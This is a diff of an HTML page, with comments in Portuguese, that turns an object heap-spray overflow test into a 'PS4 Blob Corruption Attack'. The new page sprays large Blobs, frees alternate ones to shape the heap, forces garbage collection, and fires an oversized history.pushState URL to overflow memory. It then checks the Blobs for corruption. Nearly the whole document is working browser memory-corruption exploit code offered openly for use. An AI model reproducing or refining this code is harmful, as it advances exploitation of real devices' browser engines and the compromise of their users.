@@ -1,117 +1,113 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Object Breaker: New Target</title>
+    <title>PS4 Blob Corruption Attack</title>
     <style>
-        body { background: #200; color: #fa0; font-family: monospace; padding: 20px; }
-        .log { border: 1px solid #fa0; height: 350px; overflow-y: scroll; padding: 10px; background: #100; color: #fff; margin-bottom: 15px;}
-        button { 
-            padding: 20px; width: 100%; font-size: 20px; font-weight: bold; 
-            cursor: pointer; border: 2px solid #fa0; 
-            background: #410; color: #fa0; transition: 0.2s;
-        }
-        button:hover { background: #fa0; color: #000; }
+        body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
+        button { font-size: 20px; padding: 15px; width: 100%; border: 2px solid #ff00ff; background: #222; color: #fff; cursor: pointer; }
+        #log { border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; color: cyan; }
     </style>
 </head>
 <body>
-    <h1>OBJECT BREAKER</h1>
-    <p>Alvo: Objetos JS Puros (Sem Gigacage)</p>
-    <p>Base: 709518 | Payload: 64 Bytes de ZEROS</p>
 
-    <button onclick="runObjectTest()">INICIAR ATAQUE A OBJETOS</button>
+    <h1>Estratégia: Blob Spray</h1>
+    <p>Tentando corromper dados binários (Blobs) no Large Heap.</p>
 
-    <div id="logger" class="log">Aguardando...</div>
+    <button onclick="startBlobAttack()">INICIAR ATAQUE BLOB</button>
+    <div id="log">Pronto.</div>
 
     <script>
-        const logger = document.getElementById('logger');
-        const BASE_SIZE = 709518; 
-        const MAGIC = 0x41414141; // 1094795585 em decimal
-        const SPRAY_SIZE = 15000;
+        const BASE_OFFSET = 709522;
+        const OVERFLOW_AMT = 1024 * 64; 
+        
+        // Tamanho do Blob (Tenta alinhar com o Bucket de 1MB)
+        const BLOB_SIZE = 1024 * 1024; 
+        const SPRAY_COUNT = 200; // Blobs consomem muita RAM, cuidado
 
-        var spray = [];
+        var victims = [];
 
-        function log(msg, type) {
-            const d = document.createElement('div');
-            d.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
-            if(type) d.style.color = type;
-            logger.appendChild(d);
-            logger.scrollTop = logger.scrollHeight;
+        function log(msg) {
+            const el = document.getElementById('log');
+            el.innerHTML += `<div>${msg}</div>`;
+            el.scrollTop = el.scrollHeight;
         }
 
-        async function runObjectTest() {
-            log("---------------------------------------");
-            log("TROCANDO ALVO: De Uint32Array para Object {...}");
+        async function startBlobAttack() {
+            log("1. Gerando " + SPRAY_COUNT + " Blobs...");
+            
+            // Cria um ArrayBuffer base cheio de 'B' (0x42)
+            let buffer = new Uint8Array(BLOB_SIZE);
+            buffer.fill(0x42); 
 
-            spray = null;
-            if(window.gc) window.gc();
-            await new Promise(r => setTimeout(r, 300));
-            spray = [];
+            victims = [];
 
-            // 1. SPRAY DE OBJETOS REAIS
-            // Objetos simples ficam no Heap "Normal", junto com as Strings.
-            for(let i=0; i < SPRAY_SIZE; i++) {
-                // Criamos um objeto com propriedades INLINE
-                let obj = {
-                    id: i,           // Pra saber quem é
-                    a: MAGIC,        // Marcador 1
-                    b: MAGIC,        // Marcador 2
-                    c: 0xDEADBEEF    // Marcador 3
-                };
-                spray.push(obj);
+            // SPRAY
+            for(let i=0; i<SPRAY_COUNT; i++) {
+                // Cria o Blob a partir do buffer
+                let blob = new Blob([buffer], {type: "application/octet-stream"});
+                victims.push(blob);
             }
 
-            log("Objetos alocados. Estabilizando...");
-            await new Promise(r => setTimeout(r, 1000));
-
-            try {
-                // 2. INJEÇÃO
-                // Base + 64 bytes de zeros
-                let base = new Array(BASE_SIZE + 1).join('A');
-                let overflow = new Array(65).join('\x00');
-                let payload = base + overflow;
-
-                history.pushState({}, "pwn_" + Date.now(), payload);
-                
-                // 3. VERIFICAÇÃO
-                checkObjects();
-
-            } catch(e) {
-                log("ERRO: " + e.message, "red");
+            // FENG SHUI (Buracos)
+            log("2. Abrindo buracos...");
+            for(let i=0; i<SPRAY_COUNT; i+=2) {
+                victims[i] = null; // Libera referência
             }
+            
+            // Força GC
+            await forceGC();
+
+            log("3. Disparando Overflow...");
+            
+            // Payload
+            let pwnStr = "A".repeat(BASE_OFFSET) + "\x01".repeat(OVERFLOW_AMT);
+            history.pushState({}, "blob_pwn", "/" + pwnStr);
+
+            log("4. Lendo Blobs de volta (Isso pode demorar)...");
+            checkBlobs();
         }
 
-        function checkObjects() {
+        async function checkBlobs() {
             let found = false;
-            // Varredura reversa
-            for(let i = spray.length - 1; i >= 0; i--) {
-                let obj = spray[i];
-                
-                if(obj) {
-                    // Verificamos se as propriedades mudaram
-                    // Se sobrescrevermos com Zeros, obj.a vai virar 0 ou undefined
+            
+            for(let i=1; i<victims.length; i+=2) {
+                let blob = victims[i];
+                if(!blob) continue;
+
+                // Precisamos ler o conteúdo do Blob para ver se mudou
+                try {
+                    let content = await readBlob(blob);
                     
-                    if(obj.a !== MAGIC || obj.b !== MAGIC) {
+                    // Verifica o começo e o fim
+                    // Se encontrar o byte 1 (0x01) em vez de 66 (0x42 'B'), BINGO
+                    if (content[0] === 1 || content[100] === 1) {
+                        log(`<h2 style='color:#0f0'>!!! SUCESSO !!! Blob ${i} CORROMPIDO</h2>`);
+                        alert("BLOB CORRUPTED!");
                         found = true;
-                        document.body.style.background = "#0f0";
-                        
-                        let msg = `SUCESSO! Objeto [${i}] Corrompido!`;
-                        msg += `\nOriginal: ${MAGIC}`;
-                        msg += `\nLido A: ${obj.a}`;
-                        msg += `\nLido B: ${obj.b}`;
-                        
-                        alert(msg);
-                        return;
+                        break;
                     }
-                    
-                    // Checagem de Identidade (Se o ID mudar, corrompeu também)
-                    if(obj.id !== i) {
-                        found = true;
-                        alert(`SUCESSO! ID Corrompido no index ${i}. Leu: ${obj.id}`);
-                        return;
-                    }
+                } catch(e) {
+                    log("Erro ao ler blob " + i);
                 }
             }
-            if(!found) log("Nenhum objeto afetado. Tente aumentar o overflow (botão Void Walker) com esses objetos.");
+            if(!found) log("Nenhum Blob corrompido.");
+        }
+
+        function readBlob(blob) {
+            return new Promise((resolve, reject) => {
+                let reader = new FileReader();
+                reader.onload = () => {
+                    resolve(new Uint8Array(reader.result));
+                };
+                reader.onerror = reject;
+                // Lê apenas os primeiros bytes para ser rápido
+                reader.readAsArrayBuffer(blob.slice(0, 1024)); 
+            });
+        }
+
+        async function forceGC() {
+            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
+            return new Promise(r => setTimeout(r, 500));
         }
     </script>
 </body>
